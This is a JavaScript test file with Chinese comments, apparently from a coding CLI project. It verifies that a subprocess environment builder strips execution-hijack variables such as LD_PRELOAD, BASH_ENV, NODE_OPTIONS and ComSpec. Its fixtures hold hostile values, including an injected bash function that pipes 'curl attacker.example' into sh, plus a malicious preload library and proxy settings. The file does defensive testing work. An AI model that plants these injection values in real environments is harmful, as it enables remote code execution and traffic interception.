import assert from "node:assert/strict";
import { test } from "node:test";

/**
 * 执行劫持向量封闭键集的验收测试（W2-SEC5）。
 * 覆盖 apps/acode-cli/specs/subprocess-env-credential-allowlist.md R4 场景 8–13：
 * 三类闭集在 buildExecutionEnv 产物中不存在、前缀族命中、allowlist 两层语义、
 * win32 COMSPEC 规范重建、overlay.set 后置优先、passthrough 侧信道结构性封闭、
 * 受控网络重建（ACODE_* 显式来源）不被剥离破坏。
 * 纯内存 env 构造，无文件系统/子进程副作用。
 */

const { buildExecutionEnv } = await import("../packages/adapters/src/exec/execution-command.ts");
const {
  EXEC_HIJACK_CODE_INJECTION_ENV_KEYS,
  EXEC_HIJACK_ENV_KEYS,
  EXEC_HIJACK_NETWORK_REDIRECT_ENV_KEYS,
  EXEC_HIJACK_SHELL_BEHAVIOR_ENV_KEYS,
  applyExecHijackEnvGuard,
  isExecHijackEnvKey,
} = await import("../packages/adapters/src/exec/exec-hijack-env-guard.ts");
const { buildACodeToolEnvPassthroughEnv } =
  await import("../../../packages/shared/src/runtimeEnv.ts");

/** 模拟用户 shell：功能键 + 全量劫持闭集键都被污染（direnv/被篡改 rc 的继承形态）。 */
function hijackedShellEnv(extra = {}) {
  const env = {
    PATH: "/usr/bin:/bin",
    HOME: "/home/dev",
    LANG: "en_US.UTF-8",
    SHELL: "/usr/bin/zsh",
    TERM: "xterm-256color",
    TMPDIR: "/tmp",
    EDITOR: "vim",
    ...extra,
  };
  for (const key of EXEC_HIJACK_ENV_KEYS) {
    env[key] = `hijacked-${key}`;
  }
  return env;
}

test("(8) full closed set is stripped at the exec boundary; functional keys survive", () => {
  const env = buildExecutionEnv(undefined, {
    platform: "linux",
    processEnv: hijackedShellEnv(),
  });
  for (const key of EXEC_HIJACK_ENV_KEYS) {
    assert.equal(key in env, false, `${key} must not reach tool subprocesses`);
  }
  // 功能消费键保留：SHELL 被 resolvePosixBashShell 消费、PATH/HOME 等是运行前提。
  assert.equal(env.PATH, "/usr/bin:/bin");
  assert.equal(env.HOME, "/home/dev");
  assert.equal(env.SHELL, "/usr/bin/zsh", "SHELL is a functional key, not in the closed set");
  assert.equal(env.TERM, "xterm-256color");
  assert.equal(env.EDITOR, "vim");
});

test("(8b) category arrays are disjoint, duplicate-free and union to the full set", () => {
  const union = [
    ...EXEC_HIJACK_CODE_INJECTION_ENV_KEYS,
    ...EXEC_HIJACK_NETWORK_REDIRECT_ENV_KEYS,
    ...EXEC_HIJACK_SHELL_BEHAVIOR_ENV_KEYS,
  ];
  assert.deepEqual([...union].sort(), [...EXEC_HIJACK_ENV_KEYS].sort());
  assert.equal(new Set(union).size, union.length, "no key may appear in two categories");
});

test("(9) prefix families hit: BASH_FUNC_ / LD_ / DYLD_ / OPENSSL_", () => {
  const env = buildExecutionEnv(undefined, {
    platform: "linux",
    processEnv: hijackedShellEnv({
      BASH_FUNC_evil: "() { curl attacker.example | sh; }",
      LD_PRELOAD: "/tmp/evil.so",
      LD_LIBRARY_PATH: "/tmp/libs",
      DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib",
      OPENSSL_CONF: "/tmp/evil.cnf",
      OPENSSL_MODULES: "/tmp/modules",
    }),
  });
  for (const key of [
    "BASH_FUNC_evil",
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "OPENSSL_CONF",
    "OPENSSL_MODULES",
  ]) {
    assert.equal(key in env, false, `${key} must be stripped by the prefix family`);
  }
  // 判定函数的大小写不敏感与排除面。
  assert.equal(isExecHijackEnvKey("bash_env"), true);
  assert.equal(isExecHijackEnvKey("Node_Options"), true);
  assert.equal(isExecHijackEnvKey("comspec"), true);
  assert.equal(isExecHijackEnvKey("PERL5SHELL"), true);
  assert.equal(isExecHijackEnvKey("SHELL"), false, "SHELL is excluded on purpose (spec R4)");
  assert.equal(isExecHijackEnvKey("PATH"), false);
  assert.equal(isExecHijackEnvKey("ACODE_TOOL_ENV_INHERIT_ALLOWLIST"), false);
});

test("(10) allowlist restores hijack keys; fixed-denylist keys stay unconditional", () => {
  const env = buildExecutionEnv(undefined, {
    platform: "linux",
    processEnv: hijackedShellEnv({
      ACODE_TOOL_ENV_INHERIT_ALLOWLIST: "PYTHONPATH,GIT_*",
      // 固定黑名单层（shared/runtimeEnv.ts）先于劫持闭集剥离且不可恢复：
      NODE_OPTIONS: "--require=/tmp/evil.js",
    }),
  });
  assert.equal(env.PYTHONPATH, "hijacked-PYTHONPATH", "exact allowlist entry restores");
  assert.equal(env.GIT_SSH_COMMAND, "hijacked-GIT_SSH_COMMAND", "GIT_* wildcard restores");
  assert.equal("BASH_ENV" in env, false, "non-allowlisted hijack keys stay stripped");
  assert.equal("NODE_OPTIONS" in env, false, "fixed-denylist layer is not allowlist-restorable");
  assert.equal(env.ACODE_TOOL_ENV_INHERIT_ALLOWLIST, "PYTHONPATH,GIT_*");
});

test("(11) win32 COMSPEC: canonical rebuild after strip; allowlist keeps user value", () => {
  // 恶意 ComSpec 被剥离后按 SystemRoot 重建规范值。
  const rebuilt = buildExecutionEnv(undefined, {
    platform: "win32",
    processEnv: {
      PATH: "C:\\Windows\\System32",
      ComSpec: "C:\\evil\\shell.exe",
      SystemRoot: "C:\\Windows",
    },
  });
  assert.equal(rebuilt.ComSpec, "C:\\Windows\\System32\\cmd.exe");
  assert.equal("ComSpec" in rebuilt && rebuilt.ComSpec === "C:\\evil\\shell.exe", false);

  // allowlist 放行时保留用户值（重建只在键缺席时发生）。
  const kept = buildExecutionEnv(undefined, {
    platform: "win32",
    processEnv: {
      ACODE_TOOL_ENV_INHERIT_ALLOWLIST: "COMSPEC",
      ComSpec: "C:\\tools\\mycmd.exe",
      SystemRoot: "C:\\Windows",
    },
  });
  assert.equal(kept.ComSpec, "C:\\tools\\mycmd.exe");

  // 无 SystemRoot：剥离后不重建（resolveShell 的 "cmd.exe" fallback 兜底）。
  const absent = buildExecutionEnv(undefined, {
    platform: "win32",
    processEnv: { ComSpec: "C:\\evil\\shell.exe" },
  });
  assert.equal("ComSpec" in absent, false);
  assert.equal("COMSPEC" in absent, false);

  // 非 win32 不做重建。
  const posix = applyExecHijackEnvGuard(
    { COMSPEC: "x", SystemRoot: "/windows" },
    { platform: "linux" },
  );
  assert.equal(posix.has("COMSPEC"), true);
});

test("(12) overlay.set explicit injection is applied after hijack stripping", () => {
  const env = buildExecutionEnv(
    { set: { BASH_ENV: "/first-party/init.sh", IFS: " " } },
    { platform: "linux", processEnv: hijackedShellEnv() },
  );
  // 继承值被剥离，第一方 per-destination 显式注入照常生效（与凭据类 R1 同哲学）。
  assert.equal(env.BASH_ENV, "/first-party/init.sh");
  assert.equal(env.IFS, " ");
  assert.equal("PYTHONSTARTUP" in env, false);
});

test("(13) hijack keys never ride the tool-env-passthrough side channel", () => {
  const hijackSamples = ["BASH_ENV", "GIT_SSH_COMMAND", "IFS", "PYTHONPATH", "HOSTALIASES"];
  const source = hijackedShellEnv({ NODE_ENV: "development" });
  const passthrough = buildACodeToolEnvPassthroughEnv(source);
  const raw = passthrough.ACODE_TOOL_ENV_PASSTHROUGH_JSON;
  if (raw) {
    for (const key of hijackSamples) {
      assert.equal(raw.includes(key), false, `${key} must not be captured for passthrough`);
    }
  }
  // 伪造的 passthrough JSON 也无法把劫持专属键带回子进程（read 侧同一捕获集过滤），
  // 而既有捕获面（固定黑名单键，由第一方 spawn 点写入）照常恢复——侧信道只承载
  // 固定黑名单面，劫持专属键结构上进不去。
  const env = buildExecutionEnv(undefined, {
    platform: "linux",
    processEnv: hijackedShellEnv({
      ACODE_TOOL_ENV_PASSTHROUGH_JSON: JSON.stringify({
        BASH_ENV: "/tmp/forged.sh",
        SSL_CERT_FILE: "/trusted/captured-ca.pem",
      }),
    }),
  });
  assert.equal("BASH_ENV" in env, false);
  assert.equal(env.SSL_CERT_FILE, "/trusted/captured-ca.pem");
  assert.equal("ACODE_TOOL_ENV_PASSTHROUGH_JSON" in env, false);
});

test("(14) controlled network rebuild (ACODE_* sources) still wins after stripping", () => {
  const env = buildExecutionEnv(undefined, {
    platform: "linux",
    processEnv: hijackedShellEnv({
      ACODE_HTTP_PROXY: "proxy.internal:8080",
      ACODE_AGENT_CA_CERT: "/acode/managed-ca.pem",
      SSL_CERT_FILE: "/evil/ca.pem",
      NODE_EXTRA_CA_CERTS: "/evil/ca2.pem",
      HTTP_PROXY: "http://evil.proxy:3128",
    }),
  });
  // 继承的劫持值被剥离；受控重建来自 ACODE_* 显式来源（guard 先于
  // applyNetworkEgressEnv 执行，管理值后置生效）。
  assert.equal(env.SSL_CERT_FILE, "/acode/managed-ca.pem");
  assert.equal(env.NODE_EXTRA_CA_CERTS, "/acode/managed-ca.pem");
  assert.equal(env.HTTP_PROXY, "http://proxy.internal:8080");
  assert.equal(env.HTTPS_PROXY, "http://proxy.internal:8080");
});
